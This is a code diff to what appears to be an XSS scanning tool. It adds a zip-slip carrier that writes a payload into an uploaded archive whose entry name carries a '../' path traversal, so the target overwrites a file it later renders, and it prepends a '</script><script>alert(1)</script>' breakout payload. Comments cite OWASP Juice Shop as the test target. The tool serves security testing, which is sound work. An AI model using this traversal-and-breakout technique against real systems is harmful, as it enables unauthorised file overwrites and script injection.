@@ -59,6 +59,40 @@ def _stored_dom_executable_first(base: dict) -> int:
     return 0 if re.search(r"\bon[a-z]+\s*=", pl, re.I) else 1
 
 
+# Phase 288: the archive carrier's breakout shape, probed BEFORE the corpus
+# bases.  A file written by an archive-traversal upload is rendered by the
+# target in one of two ways: inlined into an HTML/script context (Juice
+# Shop /promotion reads the promo .vtt into <script id="subtitle">), or
+# served directly as a document.  Only the first needs a `</script>`
+# breakout, and no corpus base has that shape.  It lives here rather than
+# in data/payloads.json because Phase 285 measured that corpus insertion
+# perturbs the shared probe budget of every other stored case (sync gate
+# FN=8 when one payload moved to the corpus front).
+_ARCHIVE_BREAKOUT_BASE = {
+    "payload": "</script><script>alert(1)</script>",
+    "tags": ["archive_breakout"],
+}
+
+
+def _build_archive_zip(entry_name: str, content: bytes) -> bytes:
+    """In-memory zip whose single entry is named ``entry_name`` verbatim.
+
+    The traversal rides in the ENTRY name, never in the multipart
+    filename (which stays clean) -- measured on the live target
+    (dev/_p287_row4.py): Juice Shop's extractor resolves
+    ``uploads/complaints/<entry>`` against the app root, so a
+    ``../../...`` entry lands outside the upload dir, and the multipart
+    layer never sees the ``../`` -- there is no percent-encoding question
+    to answer.
+    """
+    import io
+    import zipfile
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr(entry_name, content)
+    return buf.getvalue()
+
+
 class StoredBlindMixin:
     """L4 stored + L5 blind/OOB detection methods."""
 
@@ -410,7 +444,9 @@ class StoredBlindMixin:
                         method: str = "POST",
                         header_param: str | None = None,
                         relogin=None,
-                        view_click: str | None = None):
+                        view_click: str | None = None,
+                        archive_entry: str | None = None,
+                        file_field: str = "file"):
         """Phase 152: stored XSS verified by the REAL BROWSER (SPA shape).
 
         ``scan_stored`` verifies persistence by looking for the token in the
@@ -436,6 +472,23 @@ class StoredBlindMixin:
 
         Confidence mirrors ``scan_stored``: an explicit ``view_url`` is
         high; a self-view (view == inject) is medium.
+
+        Phase 288: ``archive_entry`` switches the write carrier from a field
+        value to an ARCHIVE.  The payload becomes the bytes of a file inside
+        an in-memory zip, and the zip's single entry is named
+        ``archive_entry`` verbatim -- so an app whose upload endpoint
+        extracts archives without sanitising entry names (zip-slip) can be
+        driven to overwrite a file the target later renders (Juice Shop
+        challenge #4: the promo .vtt, which /promotion inlines into
+        ``<script id="subtitle">``).  The multipart filename stays clean;
+        the traversal lives only in the entry name, so nothing depends on
+        how ``requests`` encodes ``../``.  Opt-in (CLI
+        ``--stored-archive-entry``) and **sync-only**: this whole method has
+        no async counterpart (manifest stored cases are ``engines:
+        ["sync"]``), so the carrier does not grow one either.  Overwriting
+        is REPLACE semantics -- more invasive than the additive row writes
+        the other carriers perform -- which is why it stays operator-
+        declared rather than auto-discovered.
         """
         view_url = view_url or inject_url
         explicit_view = view_url != inject_url or inject_url.rstrip(
@@ -449,7 +502,8 @@ class StoredBlindMixin:
             inject_url, "L4_stored_dom", method,
             detail=f"inject->{view_url} "
                    f"{('header:' + header_param) if header_param else 'param=' + repr(param)} "
-                   f"({'json' if json_body else 'form+json'})")
+                   f"({'json' if json_body else 'form+json'})"
+                   f"{' archive_entry=' + repr(archive_entry) if archive_entry else ''}")
 
         bases: list = []
         for ctx_name in ("html_element", "svg_context"):
@@ -467,8 +521,24 @@ class StoredBlindMixin:
         # confirmed on the FIRST probe instead of the fourth, which is what
         # keeps the safe twins inside the harness's per-case timeout.
         bases = sorted(bases, key=_stored_dom_executable_first)
+        if archive_entry:
+            # Phase 288: the write is an ARCHIVE, not a field value -- the
+            # payload is the file's bytes and the traversal rides in the zip
+            # entry name.  The breakout shape goes first: a file the target
+            # inlines into HTML (Juice Shop /promotion reads the .vtt into
+            # <script id="subtitle">) only executes through a `</script>`
+            # breakout, and no corpus base has that shape.  The corpus bases
+            # still follow, for targets that serve the overwritten file back
+            # as a document (svg/html shapes).
+            bases = [_ARCHIVE_BREAKOUT_BASE] + list(bases)
         encodings = ("json",) if json_body else ("form", "json")
         delivery = None
+        # Phase 288: in archive mode the injectable surface is the uploaded
+        # file's CONTENT (the field name alone would point a reader at a text
+        # param that was never sent); the entry path goes in the note/proof.
+        recorded_param = f"{file_field}[content]" if archive_entry else param
+        archive_note = (f" written via archive upload, zip entry "
+                        f"{archive_entry!r}") if archive_entry else ""
         for base in bases:
             token = "xssv_" + secrets.token_hex(4)
             variant = verifier.mark(base["payload"], token)
@@ -482,7 +552,25 @@ class StoredBlindMixin:
             # always rides in ``param``; companions are constant per scan.
             body: dict = dict(extra_fields or {})
             body[param] = variant
-            if header_param:
+            if archive_entry:
+                # Phase 288: multipart zip write.  Companion fields ride as
+                # form data alongside the file; the multipart filename stays
+                # clean (the traversal is inside the entry name).  A zip
+                # endpoint does not parse a form/JSON body, so this carrier
+                # replaces -- never adds to -- the body writes below.
+                try:
+                    zip_bytes = _build_archive_zip(
+                        archive_entry, variant.encode("utf-8"))
+                    req2 = self.req.request(
+                        method, inject_url,
+                        data=dict(extra_fields or {}) or None,
+                        files={file_field: (f"xssv_{token}.zip", zip_bytes,
+                                            "application/zip")})
+                    self._bump()
+                    stored = req2 is not None
+                except Exception:
+                    stored = False
+            elif header_param:
                 # Phase 277: header-borne write.  One shape only -- the
                 # form/JSON split is meaningless when the attacker string
                 # rides in a header (Juice Shop: GET /rest/saveLoginIp with
@@ -585,6 +673,7 @@ class StoredBlindMixin:
                 else:
                     confidence = "high"
                     note = "view page rendered the stored payload in a real browser"
+                note += archive_note
                 if any((h.get("sink") == "dialog") for h in hits
                        if isinstance(h, dict)):
                     note += (" (dialog carried the probe token: the stored "
@@ -607,7 +696,8 @@ class StoredBlindMixin:
                 # state the tier, but it may not raise this confidence.
                 _conf = confidence
                 self._add(Finding(**{
-                    "url": inject_url, "method": "POST", "param": param,
+                    "url": inject_url, "method": "POST",
+                    "param": recorded_param,
                     "type": "stored_dom", "context": "stored_dom_view",
                     "payload": variant, "transform": [],
                     "severity": "high", "confidence": _conf,
@@ -616,6 +706,7 @@ class StoredBlindMixin:
                     "headless": _h,
                     "proof": {"view_url": view_url, "token": token,
                               "sinks": sinks,
+                              "archive_entry": archive_entry,
                               "snippets": [str(h.get("snippet", ""))[:200]
                                            for h in hits[:3]]},
                 }))
@@ -635,6 +726,7 @@ class StoredBlindMixin:
             else:
                 confidence = "high"
                 note = "view page rendered the stored payload in a real browser"
+            note += archive_note
             _h = {"available": True, "confirmed": True, "outcome": "fired",
                   "detail": f"dom engine: marker reached sink(s) {sinks}"}
             _cls, _conf, _det = _grade_evidence(_h, confidence, (
@@ -642,7 +734,8 @@ class StoredBlindMixin:
                 f"reached executable sink(s) [{sinks}] on "
                 f"{view_url} ({note})"))
             self._add(Finding(**{
-                "url": inject_url, "method": "POST", "param": param,
+                "url": inject_url, "method": "POST",
+                "param": recorded_param,
                 "type": "stored_dom", "context": "stored_dom_view",
                 "payload": variant, "transform": [],
                 "severity": "high", "confidence": confidence,
@@ -651,6 +744,7 @@ class StoredBlindMixin:
                 "headless": _h,
                 "proof": {"view_url": view_url, "token": token,
                           "sinks": sinks,
+                          "archive_entry": archive_entry,
                           "snippets": [str(h.get("snippet", ""))[:200]
                                        for h in hits[:3]]},
             }))
